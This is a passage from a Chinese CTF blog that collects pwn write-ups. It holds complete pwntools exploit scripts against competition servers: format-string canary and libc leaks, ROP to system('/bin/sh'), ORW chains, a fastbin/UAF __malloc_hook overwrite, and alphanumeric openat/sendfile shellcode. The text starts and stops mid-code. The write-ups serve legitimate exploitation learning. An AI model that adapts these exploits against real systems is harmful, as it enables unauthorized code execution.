class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&#123;&#125;&quot;</span>.<span class="built_in">format</span>((<span class="built_in">hex</span>)(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;system_addr:&#123;&#125;&quot;</span>.<span class="built_in">format</span>((<span class="built_in">hex</span>)(system_addr)))</span><br><span class="line">log.success(<span class="string">&quot;bin_sh_addr:&#123;&#125;&quot;</span>.<span class="built_in">format</span>((<span class="built_in">hex</span>)(bin_sh_addr)))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*offset+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload2+=p64(ret)+p64(pop_rdi)</span><br><span class="line">payload2+=p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="你知道sandbox吗？"><a href="#你知道sandbox吗？" class="headerlink" title="你知道sandbox吗？"></a>你知道sandbox吗？</h1><p>正确的libc应该是ubuntu22.04自带的libc</p><p>有格式化字符串的漏洞，泄露出libc和canary</p><p>接着直接orw就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;xlctf.huhstsec.top&#x27;</span>,<span class="number">24130</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">pay=<span class="string">b&#x27;%17$p%39$p&#x27;</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Do you know orw?&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">f&quot;canary&gt;&gt;&gt;<span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x29e40</span></span><br><span class="line">log.success(<span class="string">f&quot;libc&gt;&gt;&gt;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">jmp_rax=<span class="number">0x000000000040114c</span></span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x404060</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x00000000004014c1</span></span><br><span class="line">flag=bss+<span class="number">0x100</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004014c3</span> </span><br><span class="line">pop_rdx_rbx=libc_base+<span class="number">0x0000000000090529</span> </span><br><span class="line">ret=<span class="number">0x40401a</span></span><br><span class="line"></span><br><span class="line">open_addr = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_addr=libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(canary)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#写./flag到bss</span></span><br><span class="line">payload+=p64(ret)+p64(pop_rsi_r15)+p64(bss)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+ p64(read_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(bss)+p64(pop_rsi_r15)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span> +p64(pop_rdx_rbx)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi_r15)+p64(flag)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdx_rbx)+p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>)+ p64(read_addr)</span><br><span class="line"><span class="comment">#打印出flag</span></span><br><span class="line">payload+=p64(pop_rdi)+ p64(<span class="number">1</span>) +p64(pop_rsi_r15)+p64(flag)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdx_rbx)+p64(<span class="number">50</span>)+p64(<span class="number">1</span>)+p64(write_addr)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;can you did it?&#x27;</span>,payload)</span><br><span class="line">p.send(<span class="string">b&#x27;./flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>国城杯pwn wp</title>
      <link href="/posts/902.html"/>
      <url>/posts/902.html</url>
      
        <content type="html"><![CDATA[<h1 id="vtable-hijack"><a href="#vtable-hijack" class="headerlink" title="vtable_hijack"></a>vtable_hijack</h1><p>没有去符号表好评</p><p>2.23的uaf edit可以直接堆溢出，感觉什么洞都可以打</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;125.70.243.22&#x27;</span>,<span class="number">31194</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> s, num: log.success(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(num)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;length:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recv()</span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x39bb78</span></span><br><span class="line">lg(<span class="string">&#x27;leak&#x27;</span>,leak)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x3f3e6 0x3f43a 0xd5c07</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">malloc=leak+<span class="number">0x39bb10</span></span><br><span class="line">addr=leak+<span class="number">0x39baed</span></span><br><span class="line"><span class="comment">#addr = malloc - 0x23</span></span><br><span class="line">shell=leak+<span class="number">0xd5c07</span></span><br><span class="line">lg(<span class="string">&#x27;malloc&#x27;</span>,malloc)</span><br><span class="line">lg(<span class="string">&#x27;addr&#x27;</span>,addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x68</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(shell)</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0x23</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Alpha-Shell"><a href="#Alpha-Shell" class="headerlink" title="Alpha_Shell"></a>Alpha_Shell</h1><p>不知道为什么，我ida f5大法失败</p><p>这题就是一个纯shellcode的编写</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412092015831.png" alt="image-20241209201529736"></p><p>沙箱禁用了很多的函数，这里使用openat+sendfile</p><p>附上官方的wp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;125.70.243.22&#x27;</span>,<span class="number">31801</span>)</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p.recvuntil(&quot;\n&quot;)</span></span><br><span class="line">shellcode = shellcraft.openat(<span class="string">&#x27;AT_FDCWD&#x27;</span>, <span class="string">&#x27;./flag&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">shellcode += shellcraft.sendfile(<span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">50</span>)</span><br><span class="line">shellcode1 = AE64().encode(asm(shellcode), <span class="string">&#x27;rdx&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;fast&#x27;</span>)</span><br><span class="line">p.send(shellcode1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Offensive-Security"><a href="#Offensive-Security" class="headerlink" title="Offensive_Security"></a>Offensive_Security</h1><p>静态分析要到给的libc中去</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412102000648.png" alt="image-20241210200040554"></p><blockquote><p> 格式化字符串拿到随机数和泄露处部分的libc,计算到libc版本</p><p>接着通过两个线程的函数速度不一致在guess处覆盖掉authentication_code，获得最后的栈溢出</p><p>接着就是rop，我是直接通过system &#x2F;bin&#x2F;sh\x00获得本地的权限</p><blockquote><p>BUT 这题其实是要用题目给gadgets获得flag的，但是我学不明白，暂时先这样吧，后面学会了再来(有点好奇比赛里面这个题目写出来的大佬是怎么不通过这个gadgets获得权限的）</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412102029882.png" alt="image-20241210202939848"></p></blockquote></blockquote><p>事已至此，等等其他的wp吧……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(b&#x27;125.70.243.22&#x27;,31808)</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc1=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> s, num: log.success(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(num)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;[!] Please input your Username:\n&#x27;</span>,<span class="string">b&#x27;%7$s&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>)</span><br><span class="line">leak=p.recv(<span class="number">8</span>)</span><br><span class="line">debug()</span><br><span class="line">log.success(<span class="string">f&quot;leak&gt;&gt;<span class="subst">&#123;leak&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_leak=u64(p.recv(<span class="number">6</span>)[:<span class="number">8</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&quot;libc_leak&quot;</span>,libc_leak)</span><br><span class="line">libc=libc_leak-<span class="number">0x21b780</span></span><br><span class="line">lg(<span class="string">&#x27;libc&#x27;</span>,libc)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Please input your password:&#x27;</span>,leak)</span><br><span class="line">ret=<span class="number">0x0400462</span></span><br><span class="line">pop_rdi=<span class="number">0x0400661</span></span><br><span class="line">binsh=libc+<span class="built_in">next</span>(libc1.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system=libc+libc1.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;1111&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>看了挺多的文章的，还是找到了有解释的wp，还有热心的网友的帮助，这里重新构造最后的rop链</p><h3 id="汇编指令意思"><a href="#汇编指令意思" class="headerlink" title="汇编指令意思"></a>汇编指令意思</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xlat</span><br></pre></td></tr></table></figure><p>执行后的效果是 <code>AL = DS:[BX + AL]</code>, ds是段寄存器，<code>al  </code>是<code>ax</code> 寄存器的低8位部分,<code>bx</code>是16位的基址寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pop     rdx</span><br><span class="line">pop     rcx</span><br><span class="line">add     rcx, 0D093h</span><br><span class="line">bextr   rbx, rcx, rdx</span><br></pre></td></tr></table></figure><p>具体作用是从寄存器 <code>rcx</code> 中提取指定的比特区间，并将其存储到寄存器 <code>rbx</code> 中</p><blockquote><p><code>bextr</code>（Bit Extract）指令的作用是从源寄存器中提取一段连续的比特，然后将其存入目标寄存器</p><p><code>rbx</code> 是目标寄存器，存储提取的比特</p><p><code>rcx</code> 是源寄存器，包含要提取比特的值</p><p><code>rdx</code> 一般0x4000表示无偏移</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stosb</span><br></pre></td></tr></table></figure><p>它的作用是将一个字节的值（通常是 <code>AL</code> 寄存器中的值）存储到由 <code>DI</code>（或者在64位模式下是 <code>RDI</code>）寄存器所指向的内存地址，然后根据方向标志（<code>DF</code>）决定是递增还是递减目标地址</p><blockquote><p><code>AL</code> 寄存器中的值（即一个字节的数据）会被存储到 <code>ES:DI</code> 所指向的内存位置。这里 <code>ES</code> 是附加段寄存器，<code>DI</code> 是目标索引寄存器。</p><p>指令执行后，<code>DI</code> 寄存器的值会根据方向标志（<code>DF</code>）自动增加或减少。方向标志控制着内存地址的递增或递减：</p><p>如果 <code>DF</code> 为 <code>0</code>，则 <code>DI</code> 会递增（通常用于从低地址向高地址存储）。</p><p>如果 <code>DF</code> 为 <code>1</code>，则 <code>DI</code> 会递减（通常用于从高地址向低地址存储）。</p></blockquote><p>好大的目标函数</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112149530.png" alt="1"></p><h3 id="rop组成"><a href="#rop组成" class="headerlink" title="rop组成"></a>rop组成</h3><p>既然我们认识了汇编，那么怎么去组成一个gadgets呢</p><p>我们可以去先把flag的各个字符在elf文件中找到具体的地址，存放到char_locations中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> string_to_write:</span><br><span class="line">    <span class="keyword">match</span> = <span class="built_in">next</span>(elf.search(<span class="built_in">bytes</span>([char])))</span><br><span class="line">    char_addr = <span class="built_in">hex</span>(<span class="keyword">match</span> + elf_base)</span><br><span class="line">    char_locations.append(char_addr)</span><br><span class="line">    info(<span class="string">&quot;%s found at %s&quot;</span>, <span class="built_in">chr</span>(char), char_addr)</span><br></pre></td></tr></table></figure><p>接着就是我们把目标地址处，找的一个段0x600298，可读可写</p><blockquote><p> 接着就是把那三个gadgets的运用，这个说一下顺序，我们先把bextr可以pop rcx把符号在的地址进行放入rcx中，再放入rdx中，接着，因为xlat把rbx+al的值放入了al中(al开始是0)，现在al中放了一个符号了，然后我们通过pop rdi放入我们的目标地址，接着，我们用stosb把al写入rdi（目标地址中去）</p><p>在第二次循环的时候，因为al中的值是符号，没有变，所以我们加pop rcx时，要减去前面一个符号表中的ascll值</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">match</span> = <span class="built_in">next</span>(elf.search(<span class="built_in">bytes</span>([char])))</span><br><span class="line">    char_addr = <span class="built_in">hex</span>(<span class="keyword">match</span> + elf_base)</span><br><span class="line">    char_locations.append(char_addr)</span><br><span class="line">    info(<span class="string">&quot;%s found at %s&quot;</span>, <span 